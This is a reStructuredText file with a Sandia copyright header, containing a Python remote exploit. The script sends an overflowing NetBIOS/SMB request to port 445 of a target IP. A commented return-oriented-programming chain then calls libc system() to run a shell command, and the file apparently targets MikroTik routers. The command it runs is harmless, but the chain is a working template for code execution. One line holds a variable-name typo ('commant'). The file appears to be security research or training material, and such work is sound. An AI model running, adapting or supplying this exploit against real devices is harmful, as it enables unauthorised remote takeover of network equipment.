.. Copyright 2022 National Technology & Engineering Solutions of Sandia, LLC
   (NTESS).  Under the terms of Contract DE-NA0003525 with NTESS, the U.S.
   Government retains certain rights in this software.
   
   Redistribution and use in source and binary/rendered forms, with or without
   modification, are permitted provided that the following conditions are met:
   
    1. Redistributions of source code must retain the above copyright notice,
       this list of conditions and the following disclaimer.
    2. Redistributions in binary/rendered form must reproduce the above copyright
       notice, this list of conditions and the following disclaimer in the
       documentation and/or other materials provided with the distribution.
    3. Neither the name of the copyright holder nor the names of its contributors
       may be used to endorse or promote products derived from this software
       without specific prior written permission.
   
   THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
   ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
   WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
   DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
   FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
   DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
   SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
   CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
   OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

.. code::

 import socket
 import sys
 import struct
 
 if len(sys.argv) < 2:
     print("{} <ip> <exit status>".format(sys.argv[0]))
     sys.exit(1)
 
 ip = sys.argv[1]
 
 status = 5
 if len(sys.argv) == 3:
     status = int(sys.argv[2])
 
 # This is the NetBIOS session request message
 payload = b"\x81"
 
 # This is what was already in the message
 payload += b"\x00\x01\xdc\xfe\x53\x4d\x42\x40\x00\x00\x00\x00\x00\x00\x00\x01"
 payload += b"\x00\xf1\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00"
 payload += b"\x00\x00\x00\x00\x00"
 
 # This is the length of what we write into the stack
 payload += b"\xff"
 
 # This is what we clobber the stack with until the return address
 payload += b"\x4c\x49\x47\x4D\x41\x02\x49\x53\x06\x52\x45\x41\x4c\x4c\x59\x07"
 payload += b"\x4c\x41\x47\x47\x49\x4e\x47\x00\x00\x00\x00\x00\x00\x19\x00\x00"
 payload += b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x58\x00\x84\x01\x00\x00\x00"
 payload += b"\x00\x00\x00\x00\x1d\xb1\x06\x80\x80\x30\x82\x01\x40\x40\x40\x40"
 
 # This is the return address that we can overwrite
 payload += struct.pack("I", 0x0804c39d)
 
 # u_Clibc_main pointer @ 0x08071154 in the GOT
 # system @ 0x77f633c5
 
 # This is our ROP chain.
 # 0x0804c39d: pop ebx; pop ebp; ret;
 # This puts the Global Offset Table entry for libc_main into ebx
 libcaddress = 0x08071154 + 0x2f76ef36
 payload += struct.pack("I", libcaddress)    # pop ebx
 payload += struct.pack("I", 0x11111111)     # pop ebp
 payload += struct.pack("I", 0x0804f672)     # ret
 
 # 0x0804f672: add eax, dword ptr [ebx - 0x2f76ef36]; pop ebp; ret;
 # This puts the address of libc_main into eax
 payload += struct.pack("I", 0x22222222)     # pop ebp
 payload += struct.pack("I", 0xffffe426)     # ret
 
 # 0xffffe426: pop ecx; ret;
 # This puts -0x244bb into ecx.
 # -0x244ba is the offset for our libc ROP gadget vs libc_main
 payload += struct.pack("I", 0xfffdbb46)     # pop ecx
 payload += struct.pack("I", 0x0804d9bb)     # ret
 
 # 0x0804d9bb: lea eax, [ecx + eax + 1]; pop ebp; ret;
 # This performs the addition and puts the address of our libc ROP gadget into eax
 payload += struct.pack("I", 0x33333333)     # pop ebp
 payload += struct.pack("I", 0x0804dc6f)     # ret
 
 # 0x0804dc6f: push eax; add al, 0x5d; ret;
 # This jumps to the ROP gadget we want to access in libc (libc + 0xa97a).
 
 # libc + 0x0000a97a: push esp; pop esi; pop edi; pop ebp; ret;
 # This copies esp into esi
 payload += struct.pack("I", 0x44444444)     # pop edi
 payload += struct.pack("I", 0x55555555)     # pop ebp
 payload += struct.pack("I", 0x0804d3d5)     # ret
 
 # 0x0804d3d5: pop edi; pop ebp; ret;
 # This populates edi with the next return value to be used by call
 payload += struct.pack("I", 0x08050738)     # pop edi
 payload += struct.pack("I", 0x66666666)     # pop ebp
 payload += struct.pack("I", 0x0804d4e1)     # ret
 
 # 0x0804d4e1: push esi; call edi;
 # This pushes esi onto the stack and jumps to 0x08050738
 
 # 0x08050738: pop edx; pop ebx; pop ebp; ret;
 # This loads esi into ebx
 payload += struct.pack("I", 0x77777777)     # pop ebp
 payload += struct.pack("I", 0xffffe426)     # ret
 
 # 0xffffe426: pop ecx; ret;
 # This puts 0x249ED into ecx.
 # 0x249EE is the offset for system vs our libc ROP gadget (+0x5d from an earlier gadget)
 payload += struct.pack("I", 0x249ED)        # pop ecx
 payload += struct.pack("I", 0x0804d9bb)     # ret
 
 # 0x0804d9bb: lea eax, [ecx + eax + 1]; pop ebp; ret;
 # This performs the addition and puts the address of system into eax
 payload += struct.pack("I", 0x88888888)     # pop ebp
 payload += struct.pack("I", 0x08062f8a)     # ret
 
 # 0x08062f8a: xchg eax, edx; ret;
 # This swaps eax and edx, putting the address of system into edx
 payload += struct.pack("I", 0xffffe426)     # ret
 
 # 0xffffe426: pop ecx; ret;
 # This puts 0xb0 into ecx. This is the offset for our command in the stack vs ebx
 payload += struct.pack("I", 0xb0)           # pop ecx
 payload += struct.pack("I", 0x080502cb)     # ret
 
 # 0x080502cb: add ecx, ebx; push ecx; call edx;
 # This loads ecx with the address of our command and pushes it onto the stack,
 # then jumps to edx (=system)
 
 # 0x0804f7da: pop eax; pop ebx; pop ebp; ret;
 # This isn't called currently because we segfault after returning from system.
 # But if I clean this up to avoid the segfault
 # and we manage to jump here, it'll do a clean exit.
 payload += struct.pack("I", 1)              # pop eax
 payload += struct.pack("I", status)         # pop ebx
 payload += struct.pack("I", 0x99999999)     # pop ebp
 payload += struct.pack("I", 0xffffe406)     # ret to $int 0x80
 
 # Some padding before our command
 payload += struct.pack("I", 0xeeeeeeee)*25
 
 # This is the command that we want to run
 command = 'echo "Hi I am MikroTik and I have seen the face of G-d. If you can avoid '
 commant += 'segfaulting me I will tell you the secrets of the universe."; '
 command += '/bin/touch /tmp/pwnd; '
 payload += command.encode('utf-8')
 payload += b"\x00" # Null-terminate our string in case that isn't done automatically
 
 # Some padding after our command
 payload += struct.pack("I", 0xffffffff)*10
 
 # And here's the rest of the payload
 payload += b"\x00\x58\x00\x00\x00\xde\x00\xde\x00\x70\x00\x00\x00\x12\x00\x12\x00"
 payload += b"\x4e\x01\x00\x00\x08\x00\x08\x00\x60\x01\x00\x00\x0c\x00\x0c\x00\x68"
 payload += b"\x01\x00\x00\x00\x00\x00\x00\x74\x01\x00\x00\x15\x82\x08\x02\x06\x01"
 payload += b"\x00\x00\x00\x00\x00\x0f\x5b\x12\x93\x66\xec\x3d\x20\x3c\x14\xad\x91"
 payload += b"\x34\xa5\x5f\x19\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 payload += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x98\xa5\x0d\xb4\x35"
 payload += b"\xc2\x8c\xd8\x68\x7b\xa1\x8d\x35\xf8\x33\x9b\x01\x01\x00\x00\x00\x00"
 payload += b"\x00\x00\x44\x35\x9b\x0f\xe5\x7c\xd7\x01\x64\x53\xd3\xa9\xa0\xfa\x02"
 payload += b"\x7c\x00\x00\x00\x00\x01\x00\x10\x00\x4d\x00\x49\x00\x4b\x00\x52\x00"
 payload += b"\x4f\x00\x54\x00\x49\x00\x4b\x00\x02\x00\x0c\x00\x4d\x00\x53\x00\x48"
 payload += b"\x00\x4f\x00\x4d\x00\x45\x00\x03\x00\x10\x00\x4d\x00\x69\x00\x6b\x00"
 payload += b"\x72\x00\x6f\x00\x54\x00\x69\x00\x6b\x00\x04\x00\x0c\x00\x4d\x00\x53"
 payload += b"\x00\x48\x00\x4f\x00\x4d\x00\x45\x00\x08\x00\x30\x00\x30\x00\x00\x00"
 payload += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb5\x9e\xfb\x88\x68"
 payload += b"\x6e\xb0\x57\xc7\x5a\x32\x62\xe8\xb5\xdb\xb4\x35\x85\x26\x65\x91\x44"
 payload += b"\x54\xe3\xda\x3a\x73\x51\xf1\x0c\x7b\x18\x0a\x00\x10\x00\x00\x00\x00"
 payload += b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x1a\x00"
 payload += b"\x63\x00\x69\x00\x66\x00\x73\x00\x2f\x00\x4d\x00\x69\x00\x6b\x00\x72"
 payload += b"\x00\x6f\x00\x54\x00\x69\x00\x6b\x00\x00\x00\x00\x00\x57\x00\x4f\x00"
 payload += b"\x52\x00\x4b\x00\x47\x00\x52\x00\x4f\x00\x55\x00\x50\x00\x75\x00\x73"
 payload += b"\x00\x65\x00\x72\x00\x55\x00\x42\x00\x55\x00\x4e\x00\x54\x00\x55\x00"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ip,445))
 s.sendall(payload)
 
